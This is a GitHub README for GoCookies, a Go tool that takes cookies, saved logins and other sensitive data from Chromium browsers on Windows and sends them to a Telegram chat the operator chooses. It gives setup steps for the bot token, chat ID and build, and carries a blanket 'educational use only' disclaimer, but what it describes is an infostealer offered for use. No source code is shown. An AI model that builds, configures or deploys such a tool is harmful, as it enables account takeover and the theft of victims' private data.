<h1 align="center">GoCookies</h1>

<p align="center">A Golang based tool for extracting user data (cookies, logins, etc.) from Chromium browsers on Windows systems. (For educational and research purposes only)</p>

---

<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#about-the-project">About The Project</a></li>
    <li><a href="#getting-started">Getting Started</a></li>
    <li><a href="#usage">Usage</a></li>
    <li><a href="#contributing">Contributing</a></li>
    <li><a href="https://github.com/RafaelPil/GoCookies/blob/main/LICENSE">License</a></li>
    <li><a href="#disclaimer">Disclaimer</a></li>
  </ol>
</details>

## About the Project

GoCookies is a proof-of-concept tool developed in Go that targets Chromium-based browsers (like Google Chrome) on Windows systems. It extracts cookies and user data from various browser profiles.

### Features:
- Extracts cookies, and other sensitive data from Chromium-based browsers.
- Sends extracted data to a specified Telegram chat for easy access.

## Getting Started

### Prerequisites

* [Go](https://go.dev/dl/)

### Installation

Clone the repository:

```bash
git clone https://github.com/RafaelPil/GoCookies
```

Install go modules:

```bash
go mod tidy
```

- Create Telegram ChatBot`BotFather`.

Get The Telegram ChatID:
```bash
https://api.telegram.org/bot<YourBotToken>/getUpdates
```

3. Set `botToken` and `chatID` in `./main.go` file:

```bash
botToken = ""
chatID   = ""
```

## Usage

```bash
go build -o GoCookies.exe
```

## Contributing
Contributions to this project are welcome! Feel free to open issues, submit pull requests, or suggest improvements. Your feedback is valuable in making this tool better.

If you find the project useful, consider supporting its development by leaving a star ⭐. Your encouragement helps!

<a href='https://buymeacoffee.com/goatscript7'><img src='https://cdn.buymeacoffee.com/uploads/project_updates/2023/12/08f1cf468ace518fc8cc9e352a2e613f.png' width=150></a>

## Disclaimer

### Educational Use Only:

This software, known as GoCookies, is intended strictly for educational and research purposes. It is a tool to explore concepts related to system interactions and data handling. Any use of this tool for harmful or unauthorized purposes is strictly forbidden. This includes, but is not limited to, unauthorized access to systems, data theft, or violating the privacy of others.

### Usage Responsibility:

By using this software, you acknowledge that you are fully responsible for your actions. The developer of this tool does not condone its misuse and bears no responsibility for how it is applied. Users are expected to ensure their actions comply with all local, national, and international laws.

### Liability Waiver:

The creator of GoCookies is not liable for any consequences arising from the use or misuse of this software. This includes financial losses, legal issues, damages to systems or data, or any other harm caused by its use. Users assume all risks associated with running this software.

### No Support:

The author will not offer assistance or respond to inquiries regarding the misuse of this software. Questions or issues related to harmful activities will not be entertained.

### Acceptance of Terms:

By running this software, you confirm that you have read and agreed to this disclaimer. The creator explicitly disclaims any responsibility for how the software is used or misused. If you do not accept these terms, do not download or execute the program.

